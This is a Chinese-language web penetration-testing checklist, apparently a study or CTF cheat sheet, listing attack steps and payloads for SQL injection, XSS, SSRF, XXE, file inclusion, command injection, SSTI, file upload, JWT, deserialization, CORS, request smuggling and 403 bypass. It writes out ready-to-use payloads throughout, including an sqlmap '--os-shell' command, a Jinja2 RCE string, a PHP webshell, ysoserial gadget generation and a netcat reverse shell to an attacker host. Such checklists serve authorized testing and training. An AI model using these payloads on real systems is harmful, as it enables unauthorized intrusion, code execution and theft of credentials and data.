# Web 漏洞 checklist
## Reminders
- [ ] **先目录/参数枚举**，再测具体漏洞；用 Burp 拦截，记录每个 payload 与响应
	```bash
	dirsearch -u http://<target>/ -e php,html,txt -x 404,403
	ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt
	```
- [ ] 确认技术栈（语言/框架/WAF），WAF 会吞 payload，必要时换编码绕过
- [ ] 每个漏洞的验证都要**能证明影响**（whoami / 文件内容 / 回显），不是只报“存在”

## SQLi
- [ ] 找注入点（GET/POST 参数、Cookie、Header），先用单引号/双引号/数字型判断报错
	```bash
	sqlmap -u "http://<target>/page?id=1" --batch --dbs
	sqlmap -r request.txt -p id --batch --os-shell
	```
- [ ] 手工确认：`' OR 1=1-- -`、`' UNION SELECT 1,2,3-- -`、报错注入 `' AND extractvalue(1,concat(0x7e,version()))-- -`
- [ ] 布尔/时间盲注：`' AND SLEEP(5)-- -`、`' AND SUBSTRING(version(),1,1)='5'-- -`
- [ ] 目标：读库名/表/列、dump 密码 hash、读写文件（`LOAD_FILE`、`INTO OUTFILE` → webshell）

## XSS
- [ ] 反射型：参数回显位置测 `<script>alert(1)</script>`、`"><img src=x onerror=alert(1)>`
- [ ] 存储型：提交处注入 payload，看是否在其他页面/管理员视角触发
- [ ] DOM 型：看 `location.hash` / `innerHTML` / `document.write` 等 sink 是否可控
- [ ] 验证不同上下文（HTML 标签内、属性内、JS 字符串内、`<script>` 内）需要的闭合方式
- [ ] 进阶：偷 cookie（`document.cookie` 外带）、CSRF 结合、Bypass WAF（大小写/编码/事件名）

## SSRF
- [ ] 找接收 URL 的参数（图片、导入、webhook、代理）
- [ ] 测内网/回环地址：`http://127.0.0.1`、`http://169.254.169.254/latest/meta-data/`、`http://10.0.0.1`
- [ ] 绕过过滤：`http://2130706433/`、`http://0177.0.0.1/`、`http://0x7f000001/`、`http://[::1]`、重定向、DNS 重绑定
- [ ] 探测内网端口/服务，抓云元数据（AWS/GCP/Azure）
- [ ] 验证协议：`file://`、`gopher://`、`dict://`（能否读文件/打内网服务）

## XXE
- [ ] 找解析 XML 的功能点（上传/导入/API 传 XML）
- [ ] 基础实体注入读文件：
	```xml
	<?xml version="1.0"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<foo>&xxe;</foo>
	```
- [ ] 验证回显（有/无回显 → OOB 用外部实体 + 攻击机 http/ftp 监听）
	```xml
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<KALI>/x">]>
	```
- [ ] 目标：读敏感文件、SSRF、甚至 RCE（expect:// 少见，多靠文件读取拿凭据）

## LFI / RFI
- [ ] 找文件包含参数（`?page=`、`?file=`、`?lang=`），测 `../../../../etc/passwd`
- [ ] 目录穿越绕过：`..%2f`、双编码 `..%252f`、`....//`、Null 字节（旧 PHP `%00`）
- [ ] 过滤器封装（PHP）：`php://filter/convert.base64-encode/resource=index.php` 读源码
- [ ] 日志投毒（`/var/log/apache2/access.log` 塞 `<?php ...?>`）、`/proc/self/environ`、`data://`、`php://input`
- [ ] RFI：远程 URL 包含攻击机恶意 PHP（需 `allow_url_include=On`）
- [ ] 目标：读到源码找更多洞，或直接写 shell / RCE

## 命令注入
- [ ] 找调系统命令的参数（ping、traceroute、whois、备份导出）
- [ ] 分隔符注入：`;`、`|`、`&&`、`||`、换行 `%0a`、反引号 `` ` ``、`$()`
- [ ] 盲注验证：`; sleep 5`、`; ping -c 5 <KALI>`（看时间差/收包）
- [ ] 空格绕过：`${IFS}`、`%09`(TAB)、`$IFS$9`、`<` 重定向
- [ ] 目标：`whoami`、`cat /etc/passwd`、反弹 shell
	```bash
	nc -e /bin/bash <KALI> 4444
	```

## SSTI
- [ ] 找模板渲染参数（回显用户输入/错误页暴露 Jinja2/Twig/Freemarker）
- [ ] 探测：`{{7*7}}`、`${7*7}`、`<%= 7*7 %>`、`#{7*7}`、`{{config}}`
- [ ] Jinja2 RCE：
	```python
	{{''.__class__.__mro__[1].__subclasses__()}}
	{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
	```
- [ ] 常用工具 tplmap；目标 `os.popen` / `subprocess` 执行命令

## 文件上传
- [ ] 找上传点，测扩展名白/黑名单（`.php`、`.php5`、`.phtml`、`.phar`、大小写 `.pHp`、双扩展名 `.php.jpg`、`.htaccess` 覆盖）
- [ ] 内容类型/魔数绕过：改 `Content-Type: image/jpeg`、图片马 `GIF89a; <?php ... ?>`
- [ ] 路径穿越上传：`filename="../../shell.php"`
- [ ] 上传后找访问路径（dirsearch 找 upload 目录），验证能否执行
	```bash
	# webshell 示例
	<?php system($_GET['cmd']); ?>
	```

## JWT
- [ ] 解码 header/payload（jwt.io / `base64 -d`），确认算法
- [ ] `alg:none` 攻击：改 header 为 none，去掉签名
- [ ] 弱密钥爆破（HS256）：用 hashcat 或 jwt_tool 爆破 secret
	```bash
	jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
	```
- [ ] `alg` 混淆（RS256→HS256，用公钥当 HMAC 密钥）；`kid` 注入（路径穿越/命令注入）
- [ ] 篡改 payload 提权（`role:user` → `role:admin`）

## 反序列化
- [ ] 找序列化数据（PHP `O:4:"User"...`、Java `rO0AB`、Python pickle、.NET）
- [ ] 确认框架与已知 gadget 链（ysoserial 生成 Java payload、phpggc 生成 PHP payload）
	```bash
	java -jar ysoserial.jar CommonsCollections1 "cmd" > payload.bin
	phpggc Laravel/RCE1 system id
	```
- [ ] 目标：RCE / 任意文件读写 / SSRF；先用 DNS 回连验证 gadget 是否生效

## IDOR
- [ ] 找资源标识（`?id=`、`/user/123`、`?file=invoice_1.pdf`），枚举相邻 ID
- [ ] 用两个账号交叉访问：A 能访问 B 的资源 = IDOR
- [ ] 尝试不可预测但可枚举的字段（UUID 时找泄露的 UUID 列表）
- [ ] 记录影响（越权读/改/删），换请求方法（GET/POST/PUT）再测

## CSRF
- [ ] 找状态变更操作（改密码、转账、加管理员）且无 CSRF token
- [ ] 检查 token 是否可预测/可复用/与 session 未绑定，或 cookie 未设 SameSite
- [ ] 构造 PoC（Burp 生成 CSRF HTML），验证跨站自动提交是否生效

## CORS
- [ ] 发带 `Origin: https://evil.com` 的请求，看响应头
	```bash
	curl -s -H "Origin: https://evil.com" -i http://<target>/api
	```
- [ ] 危险配置：`Access-Control-Allow-Origin: <回显 Origin>` + `Allow-Credentials: true`
- [ ] 验证 `null` Origin、任意子域通配是否被接受；影响：偷取带凭据的响应

## 开放重定向
- [ ] 找 `?redirect=`、`?url=`、`?next=`、`?return=` 参数
- [ ] 测 `https://evil.com`、`//evil.com`、`/\evil.com`、编码绕过
- [ ] 影响：钓鱼、结合 OAuth 偷 token；记录跳转目标

## HTTP 请求走私（Request Smuggling）
- [ ] 确认前后端对 `Content-Length` / `Transfer-Encoding` 解析不一致
- [ ] 经典 payload（CL.TE / TE.CL）：
	```
	POST / HTTP/1.1
	Host: target
	Content-Length: 6
	Transfer-Encoding: chunked

	0

	G
	```
- [ ] 用时间差异（`sleep` 走私请求）验证；工具：Burp 的 smuggler 插件、`smuggler.py`
- [ ] 影响：缓存投毒、绕过前端 ACL、会话劫持

## 403 绕过
- [ ] 路径变换：大小写、加 `%2e`、`/./`、`//`、末尾 `%20`/`%00`/`%2f`、`..;/`
- [ ] Header 伪造：`X-Original-URL`、`X-Rewrite-URL`、`X-Forwarded-For: 127.0.0.1`、`X-Custom-IP-Authorization`
- [ ] 换 HTTP 方法：`GET`→`POST`/`HEAD`/`OPTIONS`/`TRACE`
	```bash
	ffuf -u http://<target>/admin -H "X-Original-URL: /admin" -w /path/wordlist
	```
- [ ] 目标：绕过 WAF/ACL 访问受限资源，然后再测上面的具体漏洞
